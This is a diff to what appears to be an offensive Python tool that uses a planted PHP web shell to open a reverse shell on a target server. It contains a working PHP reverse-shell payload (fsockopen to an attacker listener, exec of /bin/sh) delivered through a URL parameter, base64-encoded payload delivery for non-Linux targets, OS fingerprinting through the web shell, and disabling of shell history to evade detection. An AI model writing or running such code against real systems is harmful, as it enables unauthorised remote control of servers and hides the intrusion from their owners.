@@ -1,5 +1,6 @@
 import requests
-from config import SHELL_STABILIZATION_METHODS
+import base64
+from config import SHELL_STABILIZATION_METHODS, SHELL_CODE, DEFAULT_HEADERS
 from pwnlib.tubes.listen import listen
 
 
@@ -15,14 +16,26 @@ class ShellService:
         return listener
 
     def execute_rev_shell(self):
-        php_code = f'$sock=fsockopen("{self.lhost}",{self.lport});exec("/bin/sh -i <&3 >&3 2>&3");'
-        payload = requests.utils.quote(f"php -r '{php_code}'")
-
         try:
-            requests.get(f'{self.web_shell_url}?omega={payload}', timeout=2)
+            requests.get(self.get_shell_code_url_with_payload(), headers=DEFAULT_HEADERS, timeout=2)
         except requests.exceptions.ReadTimeout:
             pass
-    
+
+    def get_shell_code_url_with_payload(self) -> str:
+        if(self.is_linux()):
+            shell_code = f'$sock=fsockopen("{self.lhost}",{self.lport});exec("/bin/sh -i <&3 >&3 2>&3");'
+            payload = requests.utils.quote(f"php -r '{shell_code}'")
+            return f'{self.web_shell_url}?omega={payload}'
+        else:
+            plain_shell_code = SHELL_CODE.replace('LHOST', f'{self.lhost}').replace('LPORT', f'{self.lport}')
+            payload = requests.utils.quote(base64.b64encode(plain_shell_code.encode()).decode())
+            return f'{self.web_shell_url}?omega={payload}&php'
+
+    def is_linux(self) -> bool:
+        os_check_code = requests.utils.quote(base64.b64encode(b"print('OMEGA_HOST_OS = '.PHP_OS);").decode())
+        response = requests.get(f'{self.web_shell_url}?omega={os_check_code}&php', headers=DEFAULT_HEADERS)
+        return 'OMEGA_HOST_OS = LINUX' in response.content.decode().upper()
+
     def upgrade_shell(self, shell: listen):
         shell.sendline(b'export HISTFILE=/dev/null') # Avoid history
         # Get pty
